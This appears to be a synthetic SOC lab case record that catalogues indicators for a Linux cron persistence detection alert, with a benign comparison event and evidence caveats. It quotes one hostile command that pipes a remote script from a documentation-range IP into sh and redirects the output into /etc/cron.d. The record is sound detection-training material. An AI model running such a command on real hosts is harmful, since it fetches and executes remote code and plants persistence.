# CASE-009 — Indicators and Observables

## Purpose

This document records the indicators and observables identified during the CASE-009 Linux security investigation.

All indicators originate from synthetic laboratory telemetry or from the generated detection alert.

The presence of an indicator does not independently establish compromise, malware, attribution, or real-world impact.

## Alert Reference

- Alert ID: `ALERT-CASE-009-DET-LINUX-001`
- Detection ID: `DET-LINUX-001`
- Detection: Suspicious Linux Cron Persistence Detection
- Detection version: `1.0`
- Severity: High
- Confidence: High
- Supporting event: `EVT-009001`

## Host Indicators

| Indicator | Value | Source | Assessment |
|---|---|---|---|
| Host | `lab-linux-02` | `EVT-009001` | Affected laboratory endpoint associated with the alert |

The host identifier is synthetic and represents a laboratory asset.

## User Indicators

| Indicator | Value | Source | Assessment |
|---|---|---|---|
| User | `analyst` | `EVT-009001` | User context associated with the suspicious event |

The available telemetry does not establish whether the account was compromised or whether the activity was authorized.

## Process Indicators

| Indicator | Value | Source | Assessment |
|---|---|---|---|
| Process | `bash` | `EVT-009001` | Shell process associated with the suspicious command |

The presence of `bash` is not inherently malicious.

## Command-Line Indicators

Observed command:

```text
curl http://203.0.113.80/payload.sh | sh >> /etc/cron.d/system-update

Relevant characteristics:

curl was used to retrieve remote content.
The retrieved content was piped directly to sh.
Output was redirected toward a cron persistence location.
The command referenced /etc/cron.d/system-update.

The telemetry records the command line but does not prove that the remote content was successfully retrieved or executed.

File Indicators
Indicator	Value	Source	Assessment
File path	/etc/cron.d/system-update	EVT-009001	Cron persistence location referenced by suspicious activity

The telemetry does not independently establish that the file was successfully created, accepted by the cron service, or executed.

Network Observable
Indicator	Value	Source	Assessment
Destination	203.0.113.80	EVT-009001	Destination referenced by the recorded curl command

203.0.113.0/24 is reserved for documentation and example use. The value is therefore treated as a synthetic laboratory observable rather than a real threat-intelligence finding.

No claim is made that the destination represents an actual malicious infrastructure node.

Retrieved Resource Observable
Indicator	Value	Source	Assessment
Resource	/payload.sh	EVT-009001	Remote resource referenced by the shell download command

The available evidence does not contain the downloaded file, its hash, its contents, or a malware-analysis verdict.

Detection Indicators

The detection generated three indicators for EVT-009001:

1. cron_persistence_path

The referenced file path begins with:

/etc/cron.d/

This matches a monitored cron persistence location.

2. shell_download_execution

The command contains both a download utility and a shell execution pipeline:

curl ... | sh

This is suspicious because retrieved content is passed directly to a shell interpreter.

3. hidden_or_tmp_payload

The event metadata contained:

hidden_payload: true

This contributed the third detection indicator.

Benign Comparison Indicators

The investigation also reviewed EVT-009002:

Host: lab-linux-02
User: admin
Process: crontab
Command: crontab -e
File: /var/spool/cron/crontabs/admin

This event did not generate an alert.

The comparison is important because cron administration itself is not sufficient evidence of malicious activity.

Indicator Classification
Indicator	Type	Confidence	Notes
lab-linux-02	Host identifier	High	Synthetic laboratory host
analyst	User identifier	High	Synthetic telemetry context
bash	Process	High	Recorded process
/etc/cron.d/system-update	File path	High	Cron persistence location
203.0.113.80	Network observable	High	Documentation-range laboratory value
/payload.sh	Resource path	High	Recorded remote resource
cron_persistence_path	Detection indicator	High	Matched by detection logic
shell_download_execution	Detection indicator	High	Matched by detection logic
hidden_or_tmp_payload	Detection indicator	High	Derived from event metadata

Confidence describes confidence that the value or indicator was present in the supplied laboratory evidence. It does not describe confidence that the activity was malicious.

Indicators Not Available

The following potentially useful indicators are not present in the supplied case evidence:

File hash of the referenced payload
File contents
Process hash
Parent process information
DNS resolution history
Network connection result
Network response contents
Cron service logs
File creation metadata
File ownership changes
Persistence execution evidence
Malware-analysis verdict
Additional host telemetry

These missing indicators limit the investigation's ability to establish successful persistence or compromise.

Evidence Boundary

The indicators documented here are observables from the synthetic CASE-009 fixture and the generated detection result.

They should not be interpreted as proof of:

malware presence;
successful payload execution;
successful persistence;
host compromise;
attacker identity;
attacker infrastructure;
or real-world impact.

Additional evidence would be required to support those conclusions.

Laboratory Boundary

CASE-009 uses synthetic telemetry in an authorized defensive laboratory environment.

The documented indicators are intended for SOC detection, investigation, hunting, and response engineering practice.
